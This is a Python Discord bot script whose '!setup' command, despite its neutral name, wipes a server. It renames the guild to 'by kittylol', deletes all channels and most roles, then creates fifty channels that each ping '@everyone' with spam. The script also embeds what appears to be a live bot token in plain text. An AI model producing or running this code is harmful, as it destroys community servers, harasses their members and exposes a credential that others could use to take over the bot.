import asyncio
import discord
from discord.ext import commands


class SetupBot(commands.Bot):
    pass


intents = discord.Intents.all()
bot = SetupBot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    print(f"Đã đăng nhập với tư cách: {bot.user}")


@bot.command(name="setup")
async def setup(ctx):
    guild = ctx.guild

    try:
        await guild.edit(name="by kittylol")
    except Exception as e:
        print(f"Lỗi đổi tên server: {e}")

    for channel in list(guild.channels):
        try:
            await channel.delete()
        except discord.HTTPException as e:
            print(f"Lỗi xóa kênh: {e}")

    for role in list(guild.roles):
        try:
            if role != guild.default_role and role < guild.me.top_role:
                await role.delete()
        except discord.HTTPException as e:
            print(f"Lỗi xóa role: {e}")

    for i in range(50):
        try:
            channel = await guild.create_text_channel("lol by kittylol")
            await channel.send("@everyone lol by kittylol")
        except discord.HTTPException as e:
            print(f"Lỗi tạo kênh {i}: {e}")
            await asyncio.sleep(1)
            continue
        await asyncio.sleep(0.5)


if __name__ == "__main__":
    bot.run("MTU0ODMxOTczNDYzNzAwNjk2MQ.GcvLVb.XziAQTGA-zld9v9URQV9HvXIM2X3qUfrBqxc5A")
